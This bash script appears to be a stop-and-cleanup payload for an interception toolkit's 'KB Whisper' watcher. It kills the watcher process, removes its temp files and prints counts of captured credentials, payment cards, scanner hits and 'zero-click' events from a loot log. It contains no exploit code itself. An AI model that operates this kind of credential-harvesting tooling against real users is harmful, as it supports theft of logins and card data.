#!/bin/bash
# Title: KB Whisper Stop
# Description: Stops the KB Whisper watcher by exact PID, cleans its /tmp compose, and prints the live-triage summary (credentials seen, scanner crawls, zero-click gold). The portal itself keeps running - use KB Portal Stop for that.
# Author: Smaug <smaug@devbox2>
# Category: interception
# Version: 1.0

LOG green "KB Whisper Stop v1.0"

PSTATE=${KBP_STATE:-/root/loot/kb_portal}
WSTATE=${KBW_STATE:-$PSTATE}
PIDF=${KBW_PIDFILE:-/tmp/kbwhisper_watch.pid}

STOPPED=0
OLD=$(sed -n '1p' "$PIDF" 2>/dev/null)
if [ -n "$OLD" ] && kill -0 "$OLD" 2>/dev/null; then
  kill "$OLD" 2>/dev/null && STOPPED=1 && LOG green "watcher pid=$OLD stopped"
fi

# self-heal strays by EXACT compose path only (our own cmdline is this
# payload's path, so the pattern can never match us - house pkill rule)
if [ "$STOPPED" = 0 ]; then
  for P in $(pgrep -f 'ash /tmp/kbwhisper.sh' 2>/dev/null); do
    [ "$P" = "$$" ] && continue
    kill "$P" 2>/dev/null && STOPPED=1 && LOG yellow "stray watcher pid=$P stopped"
  done
fi

rm -f "$PIDF" ${KBW_NOISE:-/tmp/kbwhisper_noise} ${KBW_NOISE:-/tmp/kbwhisper_noise}.rang "${KBW_RUN:-/tmp/kbwhisper.sh}" 2>/dev/null

WL="$WSTATE/whisper.log"
if [ -f "$WL" ] && [ -s "$WL" ]; then
  N_CRED=$(grep -c ' CRED \| CARD ' "$WL" 2>/dev/null)
  N_SCAN=$(grep -c ' SCAN' "$WL" 2>/dev/null)
  N_GOLD=$(grep -c ' GOLD ' "$WL" 2>/dev/null)
  LOG cyan "live-triage summary: $((N_CRED)) cred/card, $((N_SCAN)) scanner, $((N_GOLD)) zero-click events (full log: $WL)"
else
  LOG yellow "no whisper events recorded this run"
fi

rm -f "$WSTATE/whisper.marker" 2>/dev/null

if [ "$STOPPED" = 1 ]; then
  ALERT "Whisper stopped"
else
  LOG yellow "no watcher was running - state cleaned anyway"
  ALERT "No whisper active"
fi
exit 0
